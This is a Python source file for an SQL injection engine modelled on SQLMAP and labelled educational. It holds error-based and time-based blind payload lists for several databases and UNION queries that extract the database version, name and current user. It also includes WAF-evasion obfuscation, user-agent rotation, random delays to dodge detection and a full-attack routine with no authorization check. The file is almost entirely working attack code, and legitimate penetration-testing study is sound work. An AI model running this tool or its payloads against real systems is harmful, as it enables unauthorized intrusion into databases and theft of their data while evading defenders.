"""
SQL Injection Detection and Exploitation Engine

Pure Python implementation of SQL injection detection and exploitation techniques.
Inspired by SQLMAP but implemented from scratch for educational and testing purposes.
"""

import requests
import time
import random
import re
from urllib.parse import urlencode, parse_qs, urlparse, urlunparse
from typing import Dict, List, Optional, Tuple, Any
import json


class SQLInjectionEngine:
    """
    Core engine for SQL injection detection and exploitation.
    """
    
    # User agent strings for randomization
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
    ]
    
    # Error-based SQL injection payloads
    ERROR_BASED_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "') OR ('1'='1",
        "\") OR (\"1\"=\"1",
        "' AND '1'='2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR 'x'='x",
        "') OR ('x')=('x",
        "' OR '1'='1' --",
        "' OR '1'='1' ({",
        "' OR '1'='1' /*",
    ]
    
    # Time-based blind SQL injection payloads
    TIME_BASED_PAYLOADS = {
        'mysql': [
            "' AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1 AND SLEEP(5)",
            "') AND SLEEP(5)--",
        ],
        'postgresql': [
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5)--",
            "' OR pg_sleep(5)--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '00:00:05'--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "' WAITFOR DELAY '00:00:05'--",
        ],
        'oracle': [
            "' AND DBMS_LOCK.SLEEP(5)--",
            "1' AND DBMS_LOCK.SLEEP(5)--",
        ],
    }
    
    # SQL error signatures for different databases
    SQL_ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQL Query fail.*",
        r"SQL syntax.*MariaDB",
        
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        
        # MSSQL
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"Unclosed quotation mark after the character string",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        
        # Oracle
        r"ORA-[0-9]{5}",
        r"Oracle error",
        r"Oracle.*Driver",
        
        # SQLite
        r"SQLite/JDBCDriver",
        r"SQLite.Exception",
        r"System.Data.SQLite.SQLiteException",
        
        # Generic
        r"SQLSTATE\[",
        r"Syntax error.*SQL",
        r"SQL.*error",
        r"Database error",
        r"mysql_fetch",
    ]
    
    # Database version extraction payloads
    VERSION_EXTRACTION_PAYLOADS = {
        'mysql': "' UNION SELECT @@version--",
        'postgresql': "' UNION SELECT version()--",
        'mssql': "' UNION SELECT @@version--",
        'oracle': "' UNION SELECT banner FROM v$version--",
        'sqlite': "' UNION SELECT sqlite_version()--",
    }
    
    def __init__(self, config: Dict[str, Any]):
        """
        Initialize the SQL injection engine with configuration.
        
        Args:
            config: Configuration dictionary containing:
                - use_random_delays: bool
                - min_delay: float
                - max_delay: float
                - randomize_user_agent: bool
                - use_payload_obfuscation: bool
                - verify_ssl: bool (default: False)
        """
        self.config = config
        self.session = requests.Session()
        self.results = []
        
    def _get_headers(self, custom_headers: Optional[Dict] = None) -> Dict:
        """Get request headers with optional randomization."""
        headers = custom_headers.copy() if custom_headers else {}
        
        if self.config.get('randomize_user_agent', True):
            headers['User-Agent'] = random.choice(self.USER_AGENTS)
        
        return headers
    
    def _apply_delay(self):
        """Apply random delay if configured."""
        if self.config.get('use_random_delays', False):
            delay = random.uniform(
                self.config.get('min_delay', 0.5),
                self.config.get('max_delay', 2.0)
            )
            time.sleep(delay)
    
    def _obfuscate_payload(self, payload: str) -> str:
        """
        Apply basic obfuscation to payload to evade WAF.
        """
        if not self.config.get('use_payload_obfuscation', False):
            return payload
        
        # Simple obfuscation techniques
        obfuscations = [
            lambda p: p.replace(' ', '/**/'),  # Replace spaces with comments
            lambda p: p.replace('OR', 'OR/**/'),  # Add comments
            lambda p: p.replace('AND', 'AND/**/'),
            lambda p: p.replace('=', '/*!50000=*/'),  # Version-specific comments
        ]
        
        # Apply random obfuscation
        if random.random() > 0.5:
            obfuscation = random.choice(obfuscations)
            return obfuscation(payload)
        
        return payload
    
    def _make_request(self, url: str, method: str = 'GET', 
                     params: Optional[Dict] = None,
                     data: Optional[Dict] = None,
                     cookies: Optional[Dict] = None,
                     headers: Optional[Dict] = None,
                     timeout: int = 30) -> Optional[requests.Response]:
        """
        Make HTTP request with error handling.
        """
        try:
            self._apply_delay()
            request_headers = self._get_headers(headers)
            
            verify_ssl = self.config.get('verify_ssl', False)
            
            if method.upper() == 'GET':
                response = self.session.get(
                    url,
                    params=params,
                    cookies=cookies,
                    headers=request_headers,
                    timeout=timeout,
                    verify=verify_ssl,
                    allow_redirects=True
                )
            elif method.upper() == 'POST':
                response = self.session.post(
                    url,
                    params=params,
                    data=data,
                    cookies=cookies,
                    headers=request_headers,
                    timeout=timeout,
                    verify=verify_ssl,
                    allow_redirects=True
                )
            else:
                # Support other HTTP methods
                response = self.session.request(
                    method,
                    url,
                    params=params,
                    data=data,
                    cookies=cookies,
                    headers=request_headers,
                    timeout=timeout,
                    verify=verify_ssl,
                    allow_redirects=True
                )
            
            return response
        except Exception as e:
            print(f"Request error: {e}")
            return None
    
    def _check_sql_errors(self, response: requests.Response) -> Optional[str]:
        """
        Check if response contains SQL error messages.
        
        Returns:
            Error pattern matched or None
        """
        if not response:
            return None
        
        response_text = response.text
        
        for pattern in self.SQL_ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return pattern
        
        return None
    
    def _detect_database_type(self, error_message: str) -> Optional[str]:
        """Detect database type from error message."""
        if re.search(r'MySQL|MariaDB', error_message, re.IGNORECASE):
            return 'mysql'
        elif re.search(r'PostgreSQL|pg_', error_message, re.IGNORECASE):
            return 'postgresql'
        elif re.search(r'SQL Server|MSSQL', error_message, re.IGNORECASE):
            return 'mssql'
        elif re.search(r'Oracle|ORA-', error_message, re.IGNORECASE):
            return 'oracle'
        elif re.search(r'SQLite', error_message, re.IGNORECASE):
            return 'sqlite'
        
        return None
    
    def test_error_based_sqli(self, url: str, method: str,
                              params: Optional[Dict] = None,
                              data: Optional[Dict] = None,
                              cookies: Optional[Dict] = None,
                              headers: Optional[Dict] = None) -> List[Dict]:
        """
        Test for error-based SQL injection vulnerabilities.
        
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        # Get baseline response
        baseline_response = self._make_request(url, method, params, data, cookies, headers)
        if not baseline_response:
            return findings
        
        # Test GET parameters
        if params:
            for param_name, param_value in params.items():
                for payload in self.ERROR_BASED_PAYLOADS:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_params = params.copy()
                    test_params[param_name] = str(param_value) + obfuscated_payload
                    
                    response = self._make_request(url, method, test_params, data, cookies, headers)
                    
                    if response:
                        error_pattern = self._check_sql_errors(response)
                        if error_pattern:
                            db_type = self._detect_database_type(response.text)
                            findings.append({
                                'injection_type': 'error_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'GET',
                                'test_payload': test_params[param_name],
                                'detection_evidence': f'SQL error pattern matched: {error_pattern}',
                                'database_type': db_type or 'unknown',
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'params': test_params,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'body_snippet': response.text[:500],
                                }
                            })
                            # Found vulnerability in this parameter, move to next
                            break
        
        # Test POST parameters
        if data and method.upper() == 'POST':
            for param_name, param_value in data.items():
                for payload in self.ERROR_BASED_PAYLOADS:
                    obfuscated_payload = self._obfuscate_payload(payload)
                    test_data = data.copy()
                    test_data[param_name] = str(param_value) + obfuscated_payload
                    
                    response = self._make_request(url, method, params, test_data, cookies, headers)
                    
                    if response:
                        error_pattern = self._check_sql_errors(response)
                        if error_pattern:
                            db_type = self._detect_database_type(response.text)
                            findings.append({
                                'injection_type': 'error_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'POST',
                                'test_payload': test_data[param_name],
                                'detection_evidence': f'SQL error pattern matched: {error_pattern}',
                                'database_type': db_type or 'unknown',
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'data': test_data,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'body_snippet': response.text[:500],
                                }
                            })
                            break
        
        return findings
    
    def test_time_based_sqli(self, url: str, method: str,
                             params: Optional[Dict] = None,
                             data: Optional[Dict] = None,
                             cookies: Optional[Dict] = None,
                             headers: Optional[Dict] = None) -> List[Dict]:
        """
        Test for time-based blind SQL injection vulnerabilities.
        
        Returns:
            List of vulnerability findings
        """
        findings = []
        
        # Measure baseline response time
        start_time = time.time()
        baseline_response = self._make_request(url, method, params, data, cookies, headers)
        baseline_time = time.time() - start_time
        
        if not baseline_response:
            return findings
        
        # Test different database types
        for db_type, payloads in self.TIME_BASED_PAYLOADS.items():
            # Test GET parameters
            if params:
                for param_name, param_value in params.items():
                    for payload in payloads[:2]:  # Test first 2 payloads per DB type
                        obfuscated_payload = self._obfuscate_payload(payload)
                        test_params = params.copy()
                        test_params[param_name] = str(param_value) + obfuscated_payload
                        
                        start_time = time.time()
                        response = self._make_request(url, method, test_params, data, cookies, headers)
                        response_time = time.time() - start_time
                        
                        # Check if response was delayed (accounting for network variance)
                        if response and response_time > (baseline_time + 4.0):
                            findings.append({
                                'injection_type': 'time_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'GET',
                                'test_payload': test_params[param_name],
                                'detection_evidence': (
                                    f'Time-based blind SQLi detected. '
                                    f'Baseline: {baseline_time:.2f}s, '
                                    f'Payload: {response_time:.2f}s'
                                ),
                                'database_type': db_type,
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'params': test_params,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'response_time': response_time,
                                }
                            })
                            # Found vulnerability, don't test more payloads for this param
                            break
                    
                    # If found vulnerability for this param, don't test other DB types
                    if findings and findings[-1]['vulnerable_parameter'] == param_name:
                        break
            
            # Test POST parameters
            if data and method.upper() == 'POST':
                for param_name, param_value in data.items():
                    for payload in payloads[:2]:
                        obfuscated_payload = self._obfuscate_payload(payload)
                        test_data = data.copy()
                        test_data[param_name] = str(param_value) + obfuscated_payload
                        
                        start_time = time.time()
                        response = self._make_request(url, method, params, test_data, cookies, headers)
                        response_time = time.time() - start_time
                        
                        if response and response_time > (baseline_time + 4.0):
                            findings.append({
                                'injection_type': 'time_based',
                                'vulnerable_parameter': param_name,
                                'parameter_type': 'POST',
                                'test_payload': test_data[param_name],
                                'detection_evidence': (
                                    f'Time-based blind SQLi detected. '
                                    f'Baseline: {baseline_time:.2f}s, '
                                    f'Payload: {response_time:.2f}s'
                                ),
                                'database_type': db_type,
                                'request_data': {
                                    'url': url,
                                    'method': method,
                                    'data': test_data,
                                },
                                'response_data': {
                                    'status_code': response.status_code,
                                    'response_time': response_time,
                                }
                            })
                            break
                    
                    if findings and findings[-1]['vulnerable_parameter'] == param_name:
                        break
        
        return findings
    
    def exploit_sqli(self, url: str, method: str, 
                    vulnerable_param: str, param_type: str,
                    db_type: str,
                    params: Optional[Dict] = None,
                    data: Optional[Dict] = None,
                    cookies: Optional[Dict] = None,
                    headers: Optional[Dict] = None) -> Dict[str, Any]:
        """
        Attempt to exploit SQL injection to extract information.
        
        Returns:
            Dictionary with exploitation results
        """
        exploitation_results = {
            'is_exploitable': False,
            'database_version': None,
            'current_database': None,
            'current_user': None,
            'extracted_tables': [],
            'extracted_data': {},
        }
        
        # Try to extract database version
        if db_type in self.VERSION_EXTRACTION_PAYLOADS:
            version_payload = self.VERSION_EXTRACTION_PAYLOADS[db_type]
            
            if param_type == 'GET' and params:
                test_params = params.copy()
                test_params[vulnerable_param] = version_payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST' and data:
                test_data = data.copy()
                test_data[vulnerable_param] = version_payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                response = None
            
            if response:
                # Try to extract version from response
                # This is simplified - real exploitation would need more sophisticated parsing
                version_patterns = [
                    r'(\d+\.\d+\.\d+)',  # Generic version pattern
                    r'MySQL\s+([\d\.]+)',
                    r'PostgreSQL\s+([\d\.]+)',
                    r'Microsoft SQL Server\s+([\d\.]+)',
                ]
                
                for pattern in version_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        exploitation_results['database_version'] = match.group(1)
                        exploitation_results['is_exploitable'] = True
                        break
        
        # Try to extract current database name (simplified)
        if db_type == 'mysql':
            db_name_payload = "' UNION SELECT database()--"
        elif db_type == 'postgresql':
            db_name_payload = "' UNION SELECT current_database()--"
        elif db_type == 'mssql':
            db_name_payload = "' UNION SELECT DB_NAME()--"
        else:
            db_name_payload = None
        
        if db_name_payload:
            if param_type == 'GET' and params:
                test_params = params.copy()
                test_params[vulnerable_param] = db_name_payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST' and data:
                test_data = data.copy()
                test_data[vulnerable_param] = db_name_payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                response = None
            
            if response:
                # Simple extraction (would need more sophisticated parsing)
                db_name_match = re.search(r'database[:\s]+([a-zA-Z0-9_]+)', 
                                         response.text, re.IGNORECASE)
                if db_name_match:
                    exploitation_results['current_database'] = db_name_match.group(1)
                    exploitation_results['is_exploitable'] = True
        
        # Try to extract current user (simplified)
        if db_type == 'mysql':
            user_payload = "' UNION SELECT user()--"
        elif db_type == 'postgresql':
            user_payload = "' UNION SELECT current_user--"
        elif db_type == 'mssql':
            user_payload = "' UNION SELECT SYSTEM_USER--"
        else:
            user_payload = None
        
        if user_payload:
            if param_type == 'GET' and params:
                test_params = params.copy()
                test_params[vulnerable_param] = user_payload
                response = self._make_request(url, method, test_params, data, cookies, headers)
            elif param_type == 'POST' and data:
                test_data = data.copy()
                test_data[vulnerable_param] = user_payload
                response = self._make_request(url, method, params, test_data, cookies, headers)
            else:
                response = None
            
            if response:
                user_match = re.search(r'user[:\s]+([a-zA-Z0-9_@\.-]+)', 
                                      response.text, re.IGNORECASE)
                if user_match:
                    exploitation_results['current_user'] = user_match.group(1)
                    exploitation_results['is_exploitable'] = True
        
        return exploitation_results
    
    def run_full_attack(self, url: str, method: str = 'GET',
                       params: Optional[Dict] = None,
                       data: Optional[Dict] = None,
                       cookies: Optional[Dict] = None,
                       headers: Optional[Dict] = None,
                       enable_error_based: bool = True,
                       enable_time_based: bool = True,
                       enable_exploitation: bool = True) -> List[Dict]:
        """
        Run full SQL injection attack with all enabled techniques.
        
        Returns:
            List of all findings with exploitation results
        """
        all_findings = []
        
        # Error-based detection
        if enable_error_based:
            error_findings = self.test_error_based_sqli(
                url, method, params, data, cookies, headers
            )
            all_findings.extend(error_findings)
        
        # Time-based detection
        if enable_time_based:
            time_findings = self.test_time_based_sqli(
                url, method, params, data, cookies, headers
            )
            all_findings.extend(time_findings)
        
        # Exploitation phase
        if enable_exploitation and all_findings:
            for finding in all_findings:
                if finding.get('database_type'):
                    exploitation_results = self.exploit_sqli(
                        url=url,
                        method=method,
                        vulnerable_param=finding['vulnerable_parameter'],
                        param_type=finding['parameter_type'],
                        db_type=finding['database_type'],
                        params=params,
                        data=data,
                        cookies=cookies,
                        headers=headers
                    )
                    finding['exploitation'] = exploitation_results
        
        return all_findings
